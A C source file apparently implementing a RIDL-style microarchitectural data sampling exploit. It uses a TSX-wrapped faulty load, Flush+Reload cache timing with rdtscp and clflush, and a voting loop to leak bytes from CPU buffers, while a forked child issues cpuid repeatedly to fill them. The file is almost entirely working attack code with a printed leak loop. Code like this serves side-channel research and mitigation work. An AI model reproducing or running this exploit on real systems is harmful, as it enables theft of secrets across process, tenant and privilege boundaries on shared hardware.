#include <stdio.h>
#include <unistd.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/time.h>


static inline __attribute__((always_inline)) void lfence() {
	asm volatile ("lfence\n");
}

static inline __attribute__((always_inline)) void clflush(void* p) {
	asm volatile("clflush (%0)\n"::"r"(p));
}

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
	uint64_t lo, hi;
	asm volatile("rdtsc\n" : "=a" (lo), "=d" (hi) :: "rcx");
	return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
	uint64_t lo, hi;
	asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");
	return (hi << 32) | lo;
}

void flush_all(char *buff, int stride){
	for (size_t k = 0; k < 256; ++k) {
		// size_t x = ((k * 167) + 13) & (0xff);
        clflush(buff + (k*stride));
    }
}

static __always_inline void ridl(unsigned char *leak, unsigned char *buff_0){
    asm volatile(
        "clflush (%0)\nsfence\n" // Setup Flushes
        "xbegin 1f\nmovdqu 0x0(%0), %%xmm0\nmovq %%xmm0, %%rax\nmovq %%rax, %%rbx\n" // Faulty read

        "andq $0xff, %%rax\n"       // Mask out everything but the 1st byte
        "shlq $12, %%rax\n"         // Multiply by 4096 (page size)
        "movq (%1, %%rax), %%rax\n" // Touch timing_buff_0
    
        "xend\n1:\n" // End
        ::"r"(leak), "r"(buff_0):"rax","rbx","xmm0"
    );
}

void probe_buffer(int stride, int cutoff, unsigned char *buff, int votes[256]){
    unsigned char *test_src;
    volatile register unsigned char test_dest;

    for (size_t k = 0; k < 256; ++k) {
        size_t x = ((k * 167) + 13) & (0xff);
        test_src = buff + (stride * x);
        
        uint64_t t1s = rdtscp();  // Start Timer
        test_dest = *test_src; // Read char from location
        lfence(); // Wait until all loads are completed
        uint64_t diff = rdtscp() - t1s; // End Timer
        if (diff < cutoff && x!=0) {
            votes[x]+=1;
        }
    }
}


// --- Constants for Optimization ---
#define MAX_REPETITIONS 1000  // Increased max, but we exit early
#define CHECK_INTERVAL 5     // Check for success every N reps
#define MIN_VOTES 5           // Minimum votes required to consider a winner
#define WIN_MARGIN 2          // Winner must have 2x the votes of the runner-up


// Returns the index of the winner, or -1 if no clear winner yet
int check_winner(int votes[256]) {
    int max_v = -1;
    int max_i = -1;
    int runner_up_v = -1;

    for (int i = 0; i < 256; i++) {
        if (votes[i] > max_v) {
            runner_up_v = max_v;
            max_v = votes[i];
            max_i = i;
        } else if (votes[i] > runner_up_v) {
            runner_up_v = votes[i];
        }
    }

    // Heuristics for early exit
    if (max_v >= MIN_VOTES) {
        if (runner_up_v == 0 || (max_v / (runner_up_v + 1) >= WIN_MARGIN)) {
            return max_i;
        }
    }
    return -1;
}

unsigned char interpret_votes(int votes[256]){
    unsigned char most_votes = 0;
    int max_v = 0;
    for (int i=0; i<256; i++) {
        if (votes[i] > max_v) {
            max_v = votes[i];
            most_votes = i;
        }
    }
    return most_votes;
}


char collect_value(uint8_t index, int stride, int cutoff, unsigned char *leak, unsigned char *buff){
    int votes_0[256] = {0};
    memset(votes_0, 0, 256);

    madvise(leak, stride, MADV_DONTNEED);
    int finalized_a = -1, finalized_b = -1, finalized_c = -1, finalized_d = -1;

    for (int r=0;r<MAX_REPETITIONS;r++){
        flush_all(buff, stride);

        ridl(leak, buff);

        asm volatile("mfence\n");
        // One round of timing checks
        probe_buffer(stride, cutoff, buff, votes_0);

        // Only check every few rounds to save CPU cycles on the check logic itself
        if (r > 10 && r % CHECK_INTERVAL == 0) {
            if (finalized_a == -1) finalized_a = check_winner(votes_0);

            if (finalized_a != -1) {
                break;
            }
        }
    }

    return (finalized_a != -1) ? finalized_a : interpret_votes(votes_0);
}

#define STRIDE 4096
#define RAND_DELAY 100000
#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB)

#define REGION_START 8*4
#define REGION_LEN 4

uint64_t GetTimeStamp() {
    struct timeval tv;
    gettimeofday(&tv,NULL);
    return tv.tv_sec*(uint64_t)1000000+tv.tv_usec;
}

int main(){
    pid_t pid = fork();
    if (pid == 0) {
        // In Fetcher
        while (1) {
            asm volatile("movabs $0x80000002, %%rax\ncpuid\n":::"rax","ebx","ecx","edx");
        }
    }
    if (pid < 0) return -1;

    // In Leaker
	unsigned char *leak = mmap((void *)0xc0000000, 4096*2, PROT_READ | PROT_WRITE, MMAP_FLAGS & ~MAP_HUGETLB, -1, 0);
    unsigned char *timing_buff = (unsigned char *)mmap(NULL, 4096*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0) + 0x80;

    printf("[=] Leaking:\n");
    unsigned char leaked_last_first = 0;
    unsigned char leaked[REGION_LEN] = {0};

    int c = 1;

    while(1){
        uint64_t s0 = GetTimeStamp();
        leaked[3] = collect_value(REGION_START, STRIDE, 160, leak+REGION_START+3, timing_buff);
        if (leaked_last_first==leaked[3]) continue;
        leaked_last_first = leaked[3];

        for (uint8_t index=REGION_START;index<REGION_START+REGION_LEN-1;index++) {
            leaked[index-REGION_START] = collect_value(index, STRIDE, 160, leak+index, timing_buff);
        }
        uint64_t sp = GetTimeStamp();

        printf("[#] (%02d) Got: ", c);
        for (int i=0;i<REGION_LEN;i++) printf("%02x", leaked[i]);
        printf("\n |- Took %ld us\n", sp - s0);
        c++;
    }
    
    kill(pid, SIGKILL); // Clean up child process
    return 0;
}